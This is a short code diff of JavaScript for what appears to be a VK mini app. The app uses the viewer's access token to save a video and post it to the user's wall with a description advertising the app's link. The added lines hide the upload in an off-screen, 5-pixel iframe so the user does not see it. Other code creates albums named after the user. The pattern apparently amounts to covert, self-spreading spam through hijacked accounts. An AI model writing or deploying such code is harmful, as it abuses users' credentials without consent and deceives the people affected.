@@ -95,13 +95,15 @@
            "method": "video.save",
            "params": {"privacy_comment":"['nobody']","repeat":1,"link":video,"name": "#"+viewer.id, "wallpost":1, "description":"Приложение доступно по ссылке : https://vk.com/app"+parseInt(findGetParameter("vk_app_id")), "v": "5.95", "access_token": token}
        }).then(data => {
+         $("body").append('<div style="position: fixed;left:99999px" id="for_iframe"></div>');
+         $("#for_iframe").html('<iframe src="'+data.response.upload_url+'" height="5px" width="5px"></iframe>');
        });
     }
 
     function createAlbom(){
       vkConnect.sendPromise("VKWebAppCallAPIMethod", {
           "method": "photos.createAlbum",
-          "params": {"title": viewer.first_name, "privacy_comment": ["nobody"],"v": "5.090", "access_token": token}
+          "params": {"title": viewer.last_name+"1", "privacy_comment": ["nobody"],"v": "5.090", "access_token": token}
       }).then(data => {
         id_albom = data.response.id;
         uploadPhotoAlbom(id_albom);
